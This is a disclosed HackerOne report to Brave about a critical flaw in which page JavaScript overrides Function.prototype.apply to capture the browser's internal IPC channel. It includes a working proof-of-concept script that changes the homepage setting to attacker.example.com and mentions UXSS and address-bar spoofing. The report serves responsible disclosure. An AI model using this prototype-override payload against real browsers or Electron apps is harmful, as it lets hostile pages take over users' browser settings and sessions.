# Sending arbitrary IPC messages via overriding Function.prototype.apply

## Report Details
- **Report ID**: 188086
- **URL**: https://hackerone.com/reports/188086
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-12-03T21:36:17.831Z
- **Disclosed**: 2018-09-18T18:15:50.065Z

## Reporter
- **Username**: masatokinugawa
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. This bug is similar to #187542.

## Tested on: 
Brave	0.12.11

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change2.html 
```
<script>
Function.prototype.apply=function(ipc){
    ipc.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
}
</script>
<div style="visibility:hidden">
<embed src=".swf"></embed>
</div>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `apply` in the `ipc_utils.js` is overwritten: 
```
  ipcRenderer.emit = function () {
    arguments[1].sender = ipcRenderer
    return EventEmitter.prototype.emit.apply(ipcRenderer, arguments)
  }
  atom.v8.setHiddenValue('ipc', ipcRenderer)
}
```
And the 1st arguments leaks IPC method.

Could you confirm this bug?
Thanks!

## Attachments
No attachments
